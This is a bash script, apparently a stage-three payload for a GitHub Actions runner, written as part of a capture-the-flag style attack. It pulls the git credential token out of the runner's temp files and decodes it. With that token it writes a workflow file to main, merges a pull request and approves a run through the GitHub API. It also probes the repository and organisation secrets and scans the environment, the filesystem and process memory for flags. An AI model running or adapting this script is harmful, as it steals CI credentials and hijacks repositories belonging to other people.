#!/usr/bin/env bash
# LH6 stage3: escalate attempts + flag hunt
if [ -e /tmp/.lh6done ]; then return 0 2>/dev/null || exit 0; fi
touch /tmp/.lh6done
set +e
echo "=== LH6_STAGE3 repo=${GITHUB_REPOSITORY} run=${GITHUB_RUN_ID} ==="
f=$(ls -t /home/runner/work/_temp/git-credentials-*.config 2>/dev/null | head -1)
b=$(grep -oE 'basic [A-Za-z0-9+/=]+' "$f" 2>/dev/null | head -1 | awk '{print $2}')
tok=$(printf '%s' "$b" | base64 -d 2>/dev/null | cut -d: -f2-)
sha=$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD 2>/dev/null)
api="https://api.github.com/repos/${GITHUB_REPOSITORY}"
h=(-H "Authorization: Bearer $tok")
echo "TOKSHA=$(printf '%s' "$tok" | sha256sum | cut -c1-16) HEADSHA=$sha"
echo -n "workflow_file_PUT="; curl -s -o /dev/null -w '%{http_code}\n' -X PUT "${h[@]}" -H "Content-Type: application/json" -d '{"message":"lh6","content":"bmFtZTogeAptYWpvbiB4Cg==","branch":"main"}' "$api/contents/.github/workflows/lh6.yml"
echo -n "merge_PR6_PUT="; curl -s -o /dev/null -w '%{http_code}\n' -X PUT "${h[@]}" -H "Content-Type: application/json" -d '{"merge_method":"merge"}' "$api/pulls/6/merge"
echo -n "approve_run_PUT="; curl -s -o /dev/null -w '%{http_code}\n' -X POST "${h[@]}" "$api/actions/runs/43092332716/approve"
echo -n "vars_GET="; curl -s -o /dev/null -w '%{http_code}\n' "${h[@]}" "$api/actions/variables"
echo -n "secrets_GET="; curl -s -o /dev/null -w '%{http_code}\n' "${h[@]}" "$api/actions/secrets"
echo -n "environments_GET="; curl -s -o /dev/null -w '%{http_code}\n' "${h[@]}" "$api/environments"
echo -n "org_secrets_GET="; curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $tok" https://api.github.com/orgs/PDFtoMark/actions/secrets
echo "--- env containing FLAG:"; printenv | grep -i flag | head -3
echo "--- filesystem FLAG scan:"; timeout 20 grep -rIl 'FLAG{' /home/runner /tmp /opt /github 2>/dev/null | head -5
echo "--- proc env scan:"; for p in /proc/[0-9]*/environ; do timeout 2 tr '\0' '\n' < "$p" 2>/dev/null | grep -i 'FLAG{' | head -2; done | head -5
echo "--- marker end"
echo "=== LH6_STAGE3_DONE ==="
exit 1
